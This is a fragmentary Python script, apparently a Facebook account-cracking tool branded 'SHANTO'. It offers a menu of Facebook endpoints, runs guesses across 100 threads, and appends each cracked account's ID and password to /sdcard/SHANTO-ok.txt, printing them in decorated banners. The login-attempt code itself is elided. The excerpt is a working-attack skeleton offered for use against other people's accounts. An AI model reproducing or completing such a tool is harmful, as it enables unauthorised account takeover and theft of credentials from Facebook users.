...
def sykology():
    ...
    print(logo)
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46mᴠͥɪͣᴘͫ✮⃝𝑾𝑶𝑹𝑲=(SHANTO)𝄟⃝✔️")
    print(" \033[38;5;46m=============================")
    ...
    print(" \033[38;5;46mᴠͥɪͣᴘͫ✮⃝𝑾𝑶𝑹𝑲=(SHANTO)𝄟⃝✔️")
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m[𝟏] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑴")
    print(" \033[38;5;46m[𝟐] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑴𝑩𝑨𝑺𝑰𝑪")
    print(" \033[38;5;46m[𝟑] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑷𝑭𝑹𝑬𝑬")
    print(" \033[38;5;46m[𝟒] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑷")
    print(" \033[38;5;46m[𝟓] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑿")
    print(" \033[38;5;46m[𝟔] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑻𝑶𝑼𝑪𝑯") 
    print(" \033[38;5;46m=============================")
    line()
    ...
    if gxd in ["SHANTO1","M"]:
        fb="m"
        fb1="M1"
    elif gxd in ["SHANTO 2","Mbasic"]:
        fb="mbasic"
        fb1="M2"
    elif gxd in ["SHANTO 3","Free"]:
        fb="free"
        fb1="M3"
    elif gxd in ["SHANTO 4","P"]:
        fb="p"
        fb1="M4"
    elif gxd in ["SHANTO","X"]:
        fb="x"
        fb1="M5"
    else:
        fb="touch"
    ...
    with ThreadPool(max_workers=100) as feel:
        ...
        print(logo)
        tl=str(len(SHANTO))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mSHANTO-ok.txt") 
...
def random_subb(uid,pwx,fb,fb1):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[✮⃝SHANTO𝄟⃝✔️ ᴠͥɪͣᴘͫ] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
...
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝘽𝙊𝙎𝙎 𝙀𝙈𝙍𝘼𝙉\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     SHANTO 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     SHANTO 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open("/sdcard/SHANTO-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
